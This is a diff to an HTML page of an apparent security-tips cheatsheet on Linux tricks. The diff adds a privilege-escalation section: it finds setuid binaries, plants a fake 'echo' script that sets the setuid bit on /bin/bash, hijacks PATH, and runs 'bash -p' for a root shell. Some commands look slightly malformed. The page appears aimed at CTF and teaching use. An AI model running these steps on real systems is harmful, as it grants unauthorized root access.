@@ -7,8 +7,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  
-  
+  <meta name="description" content="Linux tips">
+  <meta name="keywords" content="linux, bash, privesc">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -93,15 +93,11 @@
     <ul>
             
     
-    <ul>
+
     
-        <li><a class="" href="#wildcard">Wildcard</a></li>
+
     
-        <li><a class="" href="#run-elf-using-ld-linux">Run ELF using ld-linux</a></li>
-    
-        <li><a class="" href="#compile-cc-including-a-file">Compile C/C++ including a file</a></li>
-    
-    </ul>
+
     
 
     </ul>
@@ -374,9 +370,8 @@
         <div role="main">
           <div class="section">
             
-              <h1></h1>
-              <h1 id="linux">Linux</h1>
-<h3 id="wildcard">Wildcard</h3>
+              <h1>Linux</h1>
+              <h3 id="wildcard">Wildcard</h3>
 <pre><code class="language-bash">$ ls -al /*a*/www/*l/*la*/*la*.*
 #        /var/www/html/flag/flag.php
 </code></pre>
@@ -384,6 +379,23 @@
 -al
 $ ls *
 -rw-rw-r-- 1 root root 0 jun 28 21:38 -al
+</code></pre>
+<h3 id="privilege-escalation-using-path-variables">Privilege Escalation using PATH variables</h3>
+<p>Here is a simple script to exploit privesc on a binary/script with setuid.</p>
+<p>First you search for vulnerable files:</p>
+<pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p>If the script use commands with a relative path then. With <code>echo</code> for instance:</p>
+<pre><code class="language-bash">echo &quot;#!/bin/bash\nchmod u+s /bin/bash&quot; &gt; echo
+chmod u+x echo
+PATH `pwd`:$PATH ./vuln_binary
+</code></pre>
+<p>This script add the setuid bit to <code>/bin/bash</code>:</p>
+<pre><code class="language-bash">#!/bin/bash
+chmod u+s /bin/bash
+</code></pre>
+<p>Then you run it with the following command:</p>
+<pre><code class="language-bash">/bin/bash -p
 </code></pre>
 <h3 id="run-elf-using-ld-linux">Run ELF using ld-linux</h3>
 <p>You can run an ELF binary without the <code>x</code> flag using <code>ld-linux</code>:</p>
